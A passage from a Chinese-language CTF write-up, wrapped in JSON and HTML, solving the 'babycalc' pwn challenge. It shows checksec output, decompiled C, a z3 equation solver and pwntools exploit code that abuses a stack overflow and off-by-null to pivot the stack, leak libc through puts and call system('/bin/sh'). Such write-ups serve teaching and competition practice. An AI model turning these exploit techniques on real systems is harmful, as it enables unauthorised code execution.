calc_value+=p8(<span class=\"number\">55</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">66</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">17</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">161</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">50</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">131</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">212</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">101</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">118</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">199</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">24</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># overwrite value</span></span><br><span class=\"line\">    write_char=<span class=\"string\">&#x27;24&#x27;</span> <span class=\"comment\">#0x18 ret_address=&gt;leave</span></span><br><span class=\"line\">    payload=write_char</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">    payload+=p64(ret)*<span class=\"number\">0x6</span></span><br><span class=\"line\">    payload+=p64(pop_rdi)+p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>])</span><br><span class=\"line\">    payload+=p64(start_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xd0</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=calc_value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xfc</span>,<span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\">    payload+=p32(<span class=\"number\">0x38</span>) <span class=\"comment\"># i</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;number-&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">1</span>)+<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;good done\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    puts_addr = u64(p.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>,timeout=<span class=\"number\">1</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> puts_addr == <span class=\"number\">0</span>:</span><br><span class=\"line\">      <span class=\"keyword\">raise</span> EOFError</span><br><span class=\"line\"></span><br><span class=\"line\">    leak(<span class=\"string\">&quot;puts_addr&quot;</span>,<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">    <span class=\"comment\">#calc libc base</span></span><br><span class=\"line\">    libcbase=puts_addr-libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">    sys_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">    binsh_addr=libcbase+libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;binsh_addr&#x27;</span>,<span class=\"built_in\">hex</span>(binsh_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># gdb.attach(p,&#x27;b *0x400bb7&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#get shell </span></span><br><span class=\"line\">    write_char=<span class=\"string\">b&#x27;24&#x27;</span> <span class=\"comment\">#0x18 ret_address=&gt;leave</span></span><br><span class=\"line\">    payload=write_char</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=p64(ret)*<span class=\"number\">0xd</span></span><br><span class=\"line\">    payload+=p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class=\"line\">    <span class=\"comment\"># payload=payload.ljust(0xd0 - 0x20 + 8 - 0x10,&#x27;a&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># payload+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xd0</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=calc_value</span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xfc</span>,<span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\">    payload+=p32(<span class=\"number\">0x38</span>) <span class=\"comment\"># i</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;number-&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">1</span>)+<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">    gdb.attach(p,<span class=\"string\">&#x27;b *0x400bb7&#x27;</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;good done\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pwn()</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">  <span class=\"keyword\">try</span>:</span><br><span class=\"line\">    pwn()</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"<p>没给libc，差评。保护就开了个NX，看起来还挺友好的。</p>\n<p>需要先用z3库解方程组，之后通过下标越界修改返回地址，并通过off-by-null覆盖rbp低位爆破栈迁移。</p>","more":"<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/XHLJ/babycalc/babycalc&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>主程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number-%d:&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(i + <span class=\"number\">1</span>));</span><br><span class=\"line\">  buf[(<span class=\"type\">int</span>)read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x100</span>uLL)] = <span class=\"number\">0</span>; <span class=\"comment\">//栈溢出 末尾0溢出</span></span><br><span class=\"line\">  v0 = strtol(buf, <span class=\"number\">0LL</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  *(&amp;v3 + i) = v0; <span class=\"comment\">//任意地址写</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v4 * v3 - v6 != <span class=\"number\">36182</span></span><br><span class=\"line\">  || v3 != <span class=\"number\">19</span></span><br><span class=\"line\">  || v5 * <span class=\"number\">19</span> * v4 + v6 != <span class=\"number\">36322</span></span><br><span class=\"line\">  || (v13 + v3 - v8) * v16 != <span class=\"number\">32835</span></span><br><span class=\"line\">  || (v4 * v3 - v5) * v6 != <span class=\"number\">44170</span></span><br><span class=\"line\">  || (v5 + v4 * v3) * v6 != <span class=\"number\">51590</span></span><br><span class=\"line\">  || v9 * v8 * v7 - v10 != <span class=\"number\">61549</span></span><br><span class=\"line\">  || v10 * v15 + v4 + v18 != <span class=\"number\">19037</span></span><br><span class=\"line\">  || v9 * v8 * v7 + v10 != <span class=\"number\">61871</span></span><br><span class=\"line\">  || (v8 * v7 - v9) * v10 != <span class=\"number\">581693</span></span><br><span class=\"line\">  || v11 != <span class=\"number\">50</span></span><br><span class=\"line\">  || (v9 + v8 * v7) * v10 != <span class=\"number\">587167</span></span><br><span class=\"line\">  || v13 * v12 * v11 - v14 != <span class=\"number\">1388499</span></span><br><span class=\"line\">  || v13 * v12 * v11 + v14 != <span class=\"number\">1388701</span></span><br><span class=\"line\">  || (v12 * v11 - v13) * v14 != <span class=\"number\">640138</span></span><br><span class=\"line\">  || (v11 * v5 - v16) * v12 != <span class=\"number\">321081</span></span><br><span class=\"line\">  || (v13 + v12 * v11) * v14 != <span class=\"number\">682962</span></span><br><span class=\"line\">  || v17 * v16 * v15 - v18 != <span class=\"number\">563565</span></span><br><span class=\"line\">  || v17 * v16 * v15 + v18 != <span class=\"number\">563571</span></span><br><span class=\"line\">  || v14 != <span class=\"number\">101</span></span><br><span class=\"line\">  || (v16 * v15 - v17) * v18 != <span class=\"number\">70374</span></span><br><span class=\"line\">  || (v17 + v16 * v15) * v18 != <span class=\"number\">70518</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;good done&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>需要输入16次内容，每次都会输入<code>0x100</code>字节的内容，并且存在栈溢出，足够改写所有的变量，包括循环变量i。在这之后会使用<code>strtol(buf,0,10)</code>将字符串识别为一个<strong>1个字节的十进制数</strong>，并写到<code>*(&amp;v3 + i)</code>，由于<code>v3</code>和<code>i</code>都可由栈溢出控制，这相当于我们可以<strong>任意地址写一个字节</strong>（如果i&gt;15）。</p>\n<p>除此之外<code>buf[(int)read(0, buf, 0x100uLL)] = 0;</code>会在<code>buf</code>之后写入一个<code>&#39;\\x00&#39;</code>，可以<strong>覆盖rbp的低字节</strong>。</p>\n<p>可以尝试一下栈迁移，先覆盖rbp的低字节为<code>&#39;\\x00&#39;</code>，之后使用任意地址写将返回地址改为<code>leave ret</code>的地址。修改后的rbp有可能会指向我们的buf中，在buf中构造好ROP链，<strong>爆破</strong>一下估计就可以了。</p>\n<p>不过为了让程序能够返回，我们要先绕过前面的判断条件。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v5 * v4 * v3 - v6 != <span class=\"number\">36182</span></span><br><span class=\"line\">  || v3 != <span class=\"number\">19</span></span><br><span class=\"line\">  || v5 * <span class=\"number\">19</span> * v4 + v6 != <span class=\"number\">36322</span></span><br><span class=\"line\">  || (v13 + v3 - v8) * v16 != <span class=\"number\">32835</span></span><br><span class=\"line\">  || (v4 * v3 - v5) * v6 != <span class=\"number\">44170</span></span><br><span class=\"line\">  || (v5 + v4 * v3) * v6 != <span class=\"number\">51590</span></span><br><span class=\"line\">  || v9 * v8 * v7 - v10 != <span class=\"number\">61549</span></span><br><span class=\"line\">  || v10 * v15 + v4 + v18 != <span class=\"number\">19037</span></span><br><span class=\"line\">  || v9 * v8 * v7 + v10 != <span class=\"number\">61871</span></span><br><span class=\"line\">  || (v8 * v7 - v9) * v10 != <span class=\"number\">581693</span></span><br><span class=\"line\">  || v11 != <span class=\"number\">50</span></span><br><span class=\"line\">  || (v9 + v8 * v7) * v10 != <span class=\"number\">587167</span></span><br><span class=\"line\">  || v13 * v12 * v11 - v14 != <span class=\"number\">1388499</span></span><br><span class=\"line\">  || v13 * v12 * v11 + v14 != <span class=\"number\">1388701</span></span><br><span class=\"line\">  || (v12 * v11 - v13) * v14 != <span class=\"number\">640138</span></span><br><span class=\"line\">  || (v11 * v5 - v16) * v12 != <span class=\"number\">321081</span></span><br><span class=\"line\">  || (v13 + v12 * v11) * v14 != <span class=\"number\">682962</span></span><br><span class=\"line\">  || v17 * v16 * v15 - v18 != <span class=\"number\">563565</span></span><br><span class=\"line\">  || v17 * v16 * v15 + v18 != <span class=\"number\">563571</span></span><br><span class=\"line\">  || v14 != <span class=\"number\">101</span></span><br><span class=\"line\">  || (v16 * v15 - v17) * v18 != <span class=\"number\">70374</span></span><br><span class=\"line\">  || (v17 + v16 * v15) * v18 != <span class=\"number\">70518</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这相当于解一个方程组，官方wp是用py的z3库去算的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v5 * v4 * v3 - v6 = 36182</span><br><span class=\"line\">v3 = 19</span><br><span class=\"line\">v5 * 19 * v4 + v6 = 36322</span><br><span class=\"line\">(v13 + v3 - v8) * v16 = 32835</span><br><span class=\"line\">(v4 * v3 - v5) * v6 = 44170</span><br><span class=\"line\">(v5 + v4 * v3) * v6 = 51590</span><br><span class=\"line\">v9 * v8 * v7 - v10 = 61549</span><br><span class=\"line\">v10 * v15 + v4 + v18 = 19037</span><br><span class=\"line\">v9 * v8 * v7 + v10 = 61871</span><br><span class=\"line\">(v8 * v7 - v9) * v10 = 581693</span><br><span class=\"line\">v11 = 50</span><br><span class=\"line\">(v9 + v8 * v7) * v10 = 587167</span><br><span class=\"line\">v13 * v12 * v11 - v14 = 1388499</span><br><span class=\"line\">v13 * v12 * v11 + v14 = 1388701</span><br><span class=\"line\">(v12 * v11 - v13) * v14 = 640138</span><br><span class=\"line\">(v11 * v5 - v16) * v12 = 321081</span><br><span class=\"line\">(v13 + v12 * v11) * v14 ! 682962</span><br><span class=\"line\">v17 * v16 * v15 - v18 = 563565</span><br><span class=\"line\">v17 * v16 * v15 + v18 = 563571</span><br><span class=\"line\">v14 = 101</span><br><span class=\"line\">(v16 * v15 - v17) * v18 = 70374</span><br><span class=\"line\">(v17 + v16 * v15) * v18 = 70518 </span><br></pre></td></tr></table></figure>\n\n<p>py脚本</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span>*</span><br><span class=\"line\">v=[BitVec(<span class=\"string\">&#x27;v%d&#x27;</span>%i,<span class=\"number\">8</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>)]</span><br><span class=\"line\">s=Solver()</span><br><span class=\"line\">s.add(v[<span class=\"number\">2</span>] * v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>] - v[<span class=\"number\">3</span>] == <span class=\"number\">36182</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">0</span>] == <span class=\"number\">19</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">2</span>] * v[<span class=\"number\">0</span>] * v[<span class=\"number\">1</span>] + v[<span class=\"number\">3</span>] == <span class=\"number\">36322</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">10</span>] + v[<span class=\"number\">0</span>] - v[<span class=\"number\">5</span>]) * v[<span class=\"number\">13</span>] == <span class=\"number\">32835</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>] - v[<span class=\"number\">2</span>]) * v[<span class=\"number\">3</span>] == <span class=\"number\">44170</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">2</span>] + v[<span class=\"number\">1</span>] * v[<span class=\"number\">0</span>]) * v[<span class=\"number\">3</span>] == <span class=\"number\">51590</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">6</span>] * v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] - v[<span class=\"number\">7</span>] == <span class=\"number\">61549</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">7</span>] * v[<span class=\"number\">12</span>] + v[<span class=\"number\">1</span>] + v[<span class=\"number\">15</span>] == <span class=\"number\">19037</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">6</span>] * v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] + v[<span class=\"number\">7</span>] == <span class=\"number\">61871</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>] - v[<span class=\"number\">6</span>]) * v[<span class=\"number\">7</span>] == <span class=\"number\">581693</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">8</span>] == <span class=\"number\">50</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">6</span>] + v[<span class=\"number\">5</span>] * v[<span class=\"number\">4</span>]) * v[<span class=\"number\">7</span>] == <span class=\"number\">587167</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">10</span>] * v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] - v[<span class=\"number\">11</span>] == <span class=\"number\">1388499</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">10</span>] * v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] + v[<span class=\"number\">11</span>] == <span class=\"number\">1388701</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>] - v[<span class=\"number\">10</span>]) * v[<span class=\"number\">11</span>] == <span class=\"number\">640138</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">8</span>] * v[<span class=\"number\">2</span>] - v[<span class=\"number\">13</span>]) * v[<span class=\"number\">9</span>] == <span class=\"number\">321081</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">10</span>] + v[<span class=\"number\">9</span>] * v[<span class=\"number\">8</span>]) * v[<span class=\"number\">11</span>] == <span class=\"number\">682962</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">14</span>] * v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] - v[<span class=\"number\">15</span>] == <span class=\"number\">563565</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">14</span>] * v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] + v[<span class=\"number\">15</span>] == <span class=\"number\">563571</span>)</span><br><span class=\"line\">s.add(v[<span class=\"number\">11</span>] == <span class=\"number\">101</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>] - v[<span class=\"number\">14</span>]) * v[<span class=\"number\">15</span>] == <span class=\"number\">70374</span>)</span><br><span class=\"line\">s.add((v[<span class=\"number\">14</span>] + v[<span class=\"number\">13</span>] * v[<span class=\"number\">12</span>]) * v[<span class=\"number\">15</span>] == <span class=\"number\">70518</span>) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> s.check() == sat:  </span><br><span class=\"line\">      m = s.model()  </span><br><span class=\"line\">      <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):  </span><br><span class=\"line\">          <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(m[v[i]].as_long())</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;error&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v3~v18</span><br><span class=\"line\">0x13</span><br><span class=\"line\">0xa4</span><br><span class=\"line\">0x75</span><br><span class=\"line\">0xc6</span><br><span class=\"line\">0x17</span><br><span class=\"line\">0x82</span><br><span class=\"line\">0x11</span><br><span class=\"line\">0x21</span><br><span class=\"line\">0x32</span><br><span class=\"line\">0x43</span><br><span class=\"line\">0x54</span><br><span class=\"line\">0x65</span><br><span class=\"line\">0xf6</span><br><span class=\"line\">0x7</span><br><span class=\"line\">0x18</span><br><span class=\"line\">0x3</span><br></pre></td></tr></table></figure>\n\n<p>之后就可以开始进行利用了，首先需要泄露libc，由于开启了<code>ASLR</code>，因此这一步需要爆破一下，使得低字节被覆盖为为<code>&#39;\\x00&#39;</code>的rbp能指向<code>ROP链+0x8</code>的位置（leave会pop rbp，之后rsp会指向rbp+0x8），可以在前面填充<code>ret</code>提高命中率，最后需要返回<code>start</code>来调整栈帧。</p>\n<p>泄露了libc之后就可以走<code>system(&quot;/bin/sh&quot;)</code>了，这一步同样需要爆破一下，使得能够<code>rsp</code>指向ROP链。<strong>要注意system前调整栈对齐</strong>。</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span 